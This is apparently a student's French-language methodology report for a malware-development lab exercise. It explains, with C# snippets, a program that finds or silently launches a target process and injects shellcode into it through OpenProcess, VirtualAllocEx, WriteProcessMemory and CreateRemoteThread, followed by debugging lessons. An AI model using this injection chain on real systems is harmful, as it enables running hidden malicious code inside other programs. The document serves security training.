# Méthodologie

## Observation/Analyse
A la lecture de l'énoncé et du programme figurant en solution d'exemple, je constate que ce qui m'est demandé est de reprendre le malware généré en exercice 2 et de rendre le processus cible configurable en :  
- Prenant le nom du processus normalisé (en retirant le ".exe") en argument depuis la ligne de commande pour le rechercher
- Si le processus existe, prendre son PID directement
- Si aucun processus ne correspond au nom demandé, lancer le binaire correspondant et récupérer son PID
- Utiliser le bloc injection de l'exercice 2 mais en visant le PID obtenu

## Mise en place

### Phase de vérification des arguments en ligne de commande : 

*if (args.Length != 1)
{
    Console.WriteLine("Usage: MaldevEx2_Injection.exe <targetProcessName>");
    ...
    return;
}*

Par cette phase, le programme vérifie que exactement un argument a été fourni lors de l’exécution.
Cet argument correspond au nom du processus cible.


### Phase de normalisation du nom du processus :

*string targetProcName = args[0].Trim();
if (targetProcName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
    targetProcName = targetProcName.Substring(0, targetProcName.Length - 4);*
    
Le nom du processus fourni par l’utilisateur est nettoyé (suppression des espaces inutiles, retrait éventuel de l’extension .exe).
Cette étape est nécessaire car l’API GetProcessesByName() attend un nom sans extension.


### Phase de recherche du processus cible existant :

*Process[] found = Process.GetProcessesByName(targetProcName);*

Le programme interroge le système pour déterminer si un processus portant ce nom est déjà en cours d’exécution. 
Si le processus existe, le programme récupère l'identifiant de processus (PID) : 

*if (found.Length > 0)
{
    pid = found[0].Id;
}*

Si aucune instance du processus n'est trouvée, le programme tente de lancer l'exe correspondant au processus sollicité en supposant que celui-ci est disponible dans le path utilisateur et il récupère le PID : 

*else
{
    var p = new Process();
    p.StartInfo.FileName = targetProcName + ".exe";
    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    p.Start();
    pid = p.Id;
}*


### Phase d'affichage de la cible sélectionnée :

*Console.WriteLine($"Target process: {targetProcName} [{pid}].");*

Le programme affiche le nom du processus cible et son PID.


### Phase d'obtention d'un handle vers le processus cible :

*IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);*

Une requête est envoyée au système afin d’obtenir un handle vers le processus cible.
Ce handle représente une référence système permettant d’interagir avec le processus.


### Phase d'allocation de mémoire dans le processus cible 

*IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);*

Le programme alloue une zone mémoire dans l’espace d’adressage du processus cible 


### Phase d'écriture des données en mémoire distante 

*bool ok = WriteProcessMemory(procHandle, memAddr, sc, len, out bytesWritten);*

Le contenu du shellcode est copié dans la mémoire précédemment allouée du processus cible.


### Phase de déclenchement de l'exécution

*IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);

Le programme demande au système de créer un nouveau thread dans le processus cible, dont le point d’entrée correspond à l’adresse mémoire où les données ont été écrites.


### Phase de libération des ressources

*CloseHandle(tAddr);
CloseHandle(procHandle);*

Les handles ouverts précédemment sont fermés afin d’éviter toute fuite de ressources système.

## Retour d'expérience
- En tentant d'exécuter le fichier *MaldevEx2bonus.exe* directement en double cliquant dessus, la fenêtre s'ouvrait et se fermait instantanément. Il m'était donc impossible de lire les messages d'erreur ou les sorties Console.Writeline. J'ai constaté que lorsqu'on lance un programme console Windows hors terminal, il ferme sa fenêtre dès la fin de l'exécution, ce qui est logique. Pour résoudre ce problème, il est nécessaire de lancer le programme en ligne de commande (CMD ou PowerShell). On peut utiliser cmd /k pour forcer la fenêtre à rester ouverte. Pour un débogage, une solution consiste aussi à ajouter temporairement l'instruction Console.Readline() en fin de programme. 
- Au départ, j'avais erronément fourni le nom de processus "Target.Dummy.exe" mais le programme ne le trouvait pas alors qu'il était en cours sur la machine. Ce problème provenait du fait que l'API système Process.GetProcesssByName() attend le nom du processus sans l'extension ".exe". Pour éviter ce genre d'erreur, j'ai introduit une phase de normalisation du processus recherché, ne conservant que le nom.
- Lorsque j'ai téléchargé TargetDummy.exe depuis GitHub sur la VM de test, je l'ai fait à deux reprises pour pouvoir effectuer des captures d'écran des différentes phases. Ensuite lorsque j'ai lancé le MaldevEx2bonus.exe en ligne de commande, celui-ci n'a pas trouvé le processus TargetDummy.exe. Il m'a fallu un certain pour réaliser que le processus qui tournait était TargetDummy(1).exe et non TargetDummy.exe, ce qui n'était donc pas le nom de processus que j'avais introduit en ligne de commande. 



